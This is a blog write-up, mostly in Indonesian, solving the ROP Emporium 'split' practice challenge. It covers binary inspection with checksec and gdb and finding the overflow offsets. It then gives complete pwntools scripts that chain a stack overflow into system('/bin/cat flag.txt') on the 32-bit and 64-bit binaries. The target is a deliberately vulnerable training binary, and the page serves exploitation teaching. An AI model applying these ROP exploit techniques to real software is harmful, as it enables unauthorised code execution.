<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Writeup ROP Emporium Split [pwn] | ~/.ahm4ddm</title>
<meta name=keywords content="writeups,rop,stack-overflow,64bit,32bit">
<meta name=description content="Daftar Isi Download     ret2split32 klik   ret2split64 klik    ret2split32 Kita cek terlebih dahulu informasi file
didapatkan file ELF dan dynamically linked.
$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.">
<meta name=author content>
<link rel=canonical href=https://ahm4ddm.github.io/writeups/writeup-rope-split/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style>
<link rel=preload href=/home.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ahm4ddm.github.io/fav.ico>
<link rel=icon type=image/png sizes=16x16 href=https://ahm4ddm.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://ahm4ddm.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://ahm4ddm.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://ahm4ddm.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.89.4">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript><meta property="og:title" content="Writeup ROP Emporium Split [pwn]">
<meta property="og:description" content="Daftar Isi Download     ret2split32 klik   ret2split64 klik    ret2split32 Kita cek terlebih dahulu informasi file
didapatkan file ELF dan dynamically linked.
$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://ahm4ddm.github.io/writeups/writeup-rope-split/"><meta property="article:section" content="writeups">
<meta property="article:published_time" content="2021-02-11T23:48:14+07:00">
<meta property="article:modified_time" content="2021-02-11T23:48:14+07:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Writeup ROP Emporium Split [pwn]">
<meta name=twitter:description content="Daftar Isi Download     ret2split32 klik   ret2split64 klik    ret2split32 Kita cek terlebih dahulu informasi file
didapatkan file ELF dan dynamically linked.
$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://ahm4ddm.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"Writeup ROP Emporium Split [pwn]","item":"https://ahm4ddm.github.io/writeups/writeup-rope-split/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Writeup ROP Emporium Split [pwn]","name":"Writeup ROP Emporium Split [pwn]","description":"Daftar Isi Download     ret2split32 klik   ret2split64 klik    ret2split32 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.","keywords":["writeups","rop","stack-overflow","64bit","32bit"],"articleBody":"   Daftar Isi Download     ret2split32 klik   ret2split64 klik    ret2split32 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n$file split32 split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n$checksec split32 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) kita cek semua fungsi menggunakan gdb.\ngdb-peda$ info functions All defined functions: Non-debugging symbols: ... ... ... 0x080484d0 register_tm_clones 0x08048510 __do_global_dtors_aux 0x08048540 frame_dummy 0x08048546 main 0x080485ad pwnme 0x0804860c usefulFunction 0x08048630 __libc_csu_init 0x08048690 __libc_csu_fini 0x08048694 _fini kita lakukan disassembly fungsi main\ngdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x08048583 :\tcall 0x80483d0  0x08048588 :\tadd esp,0x10 0x0804858b :\tcall 0x80485ad  ... ... ... Pada fungsi main hanya memanggil fungsi pwnme.\nkita disassembly fungsi pwnme\ngdb-peda$ pdisas pwnme Dump of assembler code for function pwnme: ... ... ... 0x080485ee :\tpush eax 0x080485ef :\tpush 0x0 0x080485f1 :\tcall 0x80483b0  0x080485f6 :\tadd esp,0x10 0x080485f9 :\tsub esp,0xc ... ... ... Pada fungsi pwnme terdapat kerentanan read dimana tidak ada Null Byte pada saat input berakhir.\nTidak ada pemanggilan fungsi usefulFunction pada binary.\nkita cek disassembly fungsi usefulFunction ternyata ada pemanggilan system\ngdb-peda$ pdisas usefulFunction Dump of assembler code for function usefulFunction: 0x0804860c :\tpush ebp 0x0804860d :\tmov ebp,esp 0x0804860f :\tsub esp,0x8 0x08048612 :\tsub esp,0xc 0x08048615 :\tpush 0x804870e 0x0804861a :\tcall 0x80483e0  0x0804861f :\tadd esp,0x10 0x08048622 :\tnop 0x08048623 :\tleave 0x08048624 :\tret End of assembler dump. Permasalahannya yaitu fungsi ini tidak memanggil system(cat flag.txt) melainkan memanggil system(/bin/ls)\nPada challenge ini kita masih bisa memanggil /bin/cat flag.txt\nDon't just take my word for it, let's check the call to system() and that useful string are actually here. Ingat argumen dari fungsi yang dijalankan pada arsitektur 32-bit disimpan pada stack.\nsetelah kita memanggil fungsi system yang benar\nlalu kita panggil /bin/cat flag.txt\nsystem() returns after the command has been completed. Kita cari dulu offset ke EIP\nRegisters contain pattern buffer: ECX+52 found at offset: 69 EDX+52 found at offset: 69 EBP+0 found at offset: 40 EIP+0 found at offset: 44 Registers point to pattern buffer: [ESP] -- offset 48 - size ~114 Pattern buffer not found in memory Reference to pattern buffer not found in memory didapatkan 44\nKita buat kode exploit\nfrom pwn import * p = ELF('./split32') r = process('./split32') sys = p.plt['system'] magic = next(p.search(b'/bin/cat flag.txt\\x00')) log.info('system 0x%x' %sys) log.info('magic 0x%x' %magic) junk = b'X'*44 payload = junk payload += p32(sys) payload += b'Y'*4 payload += p32(magic) r.sendline(payload) r.interactive() $python3 sol.py split by ROP Emporium x86 Contriving a reason to ask user for data...  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $ ret2split64 Kita cek terlebih dahulu informasi file\ndidapatkan file ELF dan dynamically linked.\n$file split split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n$checksec split Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Setelah dilakukan pengecekan dengan gdb, semua fungsi sama.\nlangsung saja ke proses exploit.\nSebelum itu, ingat argumen dari fungsi yang dijalankan pada arsitektur 64-bit disimpan pada register RDI, RSI, RDX,RCX, R8, R9\nPertama kita cari offset terlebih dahulu\nRegisters contain pattern buffer: RBP+0 found at offset: 32 Registers point to pattern buffer: [RSP] -- offset 40 - size ~56 Pattern buffer found at: 0x00007fffffffdf30 : offset 0 - size 96 ($sp + -0x28 [-10 dwords]) References to pattern buffer found at: 0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords]) 0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords]) 0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords]) Didapatkan 40.\nKita buat kode exploit\nfrom pwn import * p = ELF('./split') r = process('./split') rop = ROP('./split') sys = p.plt['system'] magic = next(p.search(b'/bin/cat flag.txt')) popret = rop.find_gadget(['pop rdi', 'ret'])[0] log.info('system 0x%x' %sys) log.info('magic 0x%x' %magic) junk = b'X'*40 payload = junk payload += p64(popret) payload += p64(magic) payload += p64(sys) r.sendline(payload) r.interactive() $python3 sol.py Contriving a reason to ask user for data...  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $ ","wordCount":"747","inLanguage":"en","datePublished":"2021-02-11T23:48:14+07:00","dateModified":"2021-02-11T23:48:14+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ahm4ddm.github.io/writeups/writeup-rope-split/"},"publisher":{"@type":"Organization","name":"~/.ahm4ddm","logo":{"@type":"ImageObject","url":"https://ahm4ddm.github.io/fav.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://ahm4ddm.github.io/ accesskey=h title="~/.ahm4ddm (Alt + H)">
<img src=/home.png alt=logo aria-label=logo height=" 30px">~/.ahm4ddm</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://ahm4ddm.github.io/posts/ title=posts>
<span>posts</span>
</a>
</li>
<li>
<a href=https://ahm4ddm.github.io/writeups/ title=writeups>
<span>writeups</span>
</a>
</li>
<li>
<a href=https://ahm4ddm.github.io/colleges/ title=colleges>
<span>colleges</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://ahm4ddm.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://ahm4ddm.github.io/writeups/>Writeups</a></div>
<h1 class=post-title>
Writeup ROP Emporium Split [pwn]
</h1>
<div class=post-meta><span title="2021-02-11 23:48:14 +0700 WIB">February 11, 2021</span>&nbsp;·&nbsp;4 min
</div>
</header>
<div class=post-content><table>
<thead>
<tr>
<th>Daftar Isi</th>
<th>Download</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=#ret2split32>ret2split32</a></td>
<td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/split32/split32>klik</a></td>
</tr>
<tr>
<td><a href=#ret2split64>ret2split64</a></td>
<td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/split/split64>klik</a></td>
</tr>
</tbody>
</table>
<h3 id=ret2split32>ret2split32<a hidden class=anchor aria-hidden=true href=#ret2split32>#</a></h3>
<p>Kita cek terlebih dahulu informasi file<br>
didapatkan file ELF dan dynamically linked.</p>
<pre tabindex=0><code>$file split32
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped
</code></pre><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>
kita bisa bypass NX dengan metode return oriented programming (rop).</p>
<pre tabindex=0><code>$checksec split32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>kita cek semua fungsi menggunakan gdb.</p>
<pre tabindex=0><code>gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
...
...
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
</code></pre><p>kita lakukan disassembly fungsi <em><strong>main</strong></em></p>
<pre tabindex=0><code>gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
0x08048583 &lt;+61&gt;:	call   0x80483d0 &lt;puts@plt&gt;
0x08048588 &lt;+66&gt;:	add    esp,0x10
0x0804858b &lt;+69&gt;:	call   0x80485ad &lt;pwnme&gt;
...
...
...
</code></pre><p>Pada fungsi main hanya memanggil fungsi <em><strong>pwnme</strong></em>.<br>
kita disassembly fungsi <em><strong>pwnme</strong></em></p>
<pre tabindex=0><code>gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
...
   0x080485ee &lt;+65&gt;:	push   eax
   0x080485ef &lt;+66&gt;:	push   0x0
   0x080485f1 &lt;+68&gt;:	call   0x80483b0 &lt;read@plt&gt;
   0x080485f6 &lt;+73&gt;:	add    esp,0x10
   0x080485f9 &lt;+76&gt;:	sub    esp,0xc
...
...
...
</code></pre><p>Pada fungsi <em><strong>pwnme</strong></em> terdapat kerentanan <em><strong>read</strong></em> dimana tidak ada Null Byte pada saat input berakhir.<br>
Tidak ada pemanggilan fungsi <em><strong>usefulFunction</strong></em> pada binary.<br>
kita cek disassembly fungsi <em><strong>usefulFunction</strong></em>
ternyata ada pemanggilan <em><strong>system</strong></em></p>
<pre tabindex=0><code>gdb-peda$ pdisas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c &lt;+0&gt;:	push   ebp
   0x0804860d &lt;+1&gt;:	mov    ebp,esp
   0x0804860f &lt;+3&gt;:	sub    esp,0x8
   0x08048612 &lt;+6&gt;:	sub    esp,0xc
   0x08048615 &lt;+9&gt;:	push   0x804870e
   0x0804861a &lt;+14&gt;:	call   0x80483e0 &lt;system@plt&gt;
   0x0804861f &lt;+19&gt;:	add    esp,0x10
   0x08048622 &lt;+22&gt;:	nop
   0x08048623 &lt;+23&gt;:	leave  
   0x08048624 &lt;+24&gt;:	ret    
End of assembler dump.
</code></pre><p>Permasalahannya yaitu fungsi ini tidak memanggil <em><strong>system(cat flag.txt)</strong></em> melainkan memanggil <em><strong>system(/bin/ls)</strong></em><br>
Pada challenge ini kita masih bisa memanggil <em><strong>/bin/cat flag.txt</strong></em></p>
<pre tabindex=0><code>Don't just take my word for it, let's check the call to system() and that useful string are actually here.
</code></pre><p>Ingat argumen dari fungsi yang dijalankan pada arsitektur 32-bit disimpan pada stack.<br>
setelah kita memanggil fungsi <em><strong>system yang benar</strong></em><br>
lalu kita panggil <em><strong>/bin/cat flag.txt</strong></em></p>
<pre tabindex=0><code>system() returns after the command has been completed.
</code></pre><p>Kita cari dulu offset ke <em><strong>EIP</strong></em></p>
<pre tabindex=0><code>Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --&gt; offset 48 - size ~114
Pattern buffer not found in memory
Reference to pattern buffer not found in memory
</code></pre><p>didapatkan 44</p>
<p>Kita buat kode exploit</p>
<pre tabindex=0><code>from pwn import *

p = ELF('./split32')
r = process('./split32')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt\x00'))
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)
junk = b'X'*44
payload = junk
payload += p32(sys)
payload += b'Y'*4
payload += p32(magic)
r.sendline(payload)
r.interactive()
</code></pre><pre tabindex=0><code>$python3 sol.py
split by ROP Emporium
x86

Contriving a reason to ask user for data...
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
</code></pre><h3 id=ret2split64>ret2split64<a hidden class=anchor aria-hidden=true href=#ret2split64>#</a></h3>
<p>Kita cek terlebih dahulu informasi file<br>
didapatkan file ELF dan dynamically linked.</p>
<pre tabindex=0><code>$file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
</code></pre><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>
kita bisa bypass NX dengan metode return oriented programming (rop).</p>
<pre tabindex=0><code>$checksec split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Setelah dilakukan pengecekan dengan gdb, semua fungsi sama.<br>
langsung saja ke proses exploit.<br>
Sebelum itu, ingat argumen dari fungsi yang dijalankan pada arsitektur 64-bit disimpan pada register <a href=https://ctf101.org/binary-exploitation/what-are-calling-conventions/>RDI, RSI, RDX,RCX, R8, R9</a><br>
Pertama kita cari offset terlebih dahulu</p>
<pre tabindex=0><code>Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --&gt; offset 40 - size ~56
Pattern buffer found at:
0x00007fffffffdf30 : offset    0 - size   96 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])
</code></pre><p>Didapatkan 40.<br>
Kita buat kode exploit</p>
<pre tabindex=0><code>from pwn import *

p = ELF('./split')
r = process('./split')
rop = ROP('./split')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt'))
popret = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)

junk = b'X'*40
payload = junk
payload += p64(popret)
payload += p64(magic)
payload += p64(sys)

r.sendline(payload)
r.interactive()
</code></pre><pre tabindex=0><code>$python3 sol.py
Contriving a reason to ask user for data...
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
</code></pre>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://ahm4ddm.github.io/tags/writeups/>writeups</a></li>
<li><a href=https://ahm4ddm.github.io/tags/rop/>rop</a></li>
<li><a href=https://ahm4ddm.github.io/tags/stack-overflow/>stack-overflow</a></li>
<li><a href=https://ahm4ddm.github.io/tags/64bit/>64bit</a></li>
<li><a href=https://ahm4ddm.github.io/tags/32bit/>32bit</a></li>
</ul>
<nav class=paginav>
<a class=prev href=https://ahm4ddm.github.io/writeups/writeups-rope-callme/>
<span class=title>« Prev Page</span>
<br>
<span>Writeup ROP Emporium Callme [pwn]</span>
</a>
<a class=next href=https://ahm4ddm.github.io/writeups/writeup-rope-ret2win/>
<span class=title>Next Page »</span>
<br>
<span>Writeup ROP Emporium Ret2win [pwn]</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Writeup ROP Emporium Split [pwn] on twitter" href="https://twitter.com/intent/tweet/?text=Writeup%20ROP%20Emporium%20Split%20%5bpwn%5d&url=https%3a%2f%2fahm4ddm.github.io%2fwriteups%2fwriteup-rope-split%2f&hashtags=writeups%2crop%2cstack-overflow%2c64bit%2c32bit"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Writeup ROP Emporium Split [pwn] on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fahm4ddm.github.io%2fwriteups%2fwriteup-rope-split%2f&title=Writeup%20ROP%20Emporium%20Split%20%5bpwn%5d&summary=Writeup%20ROP%20Emporium%20Split%20%5bpwn%5d&source=https%3a%2f%2fahm4ddm.github.io%2fwriteups%2fwriteup-rope-split%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Writeup ROP Emporium Split [pwn] on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fahm4ddm.github.io%2fwriteups%2fwriteup-rope-split%2f&title=Writeup%20ROP%20Emporium%20Split%20%5bpwn%5d"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Writeup ROP Emporium Split [pwn] on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fahm4ddm.github.io%2fwriteups%2fwriteup-rope-split%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Writeup ROP Emporium Split [pwn] on whatsapp" href="https://api.whatsapp.com/send?text=Writeup%20ROP%20Emporium%20Split%20%5bpwn%5d%20-%20https%3a%2f%2fahm4ddm.github.io%2fwriteups%2fwriteup-rope-split%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
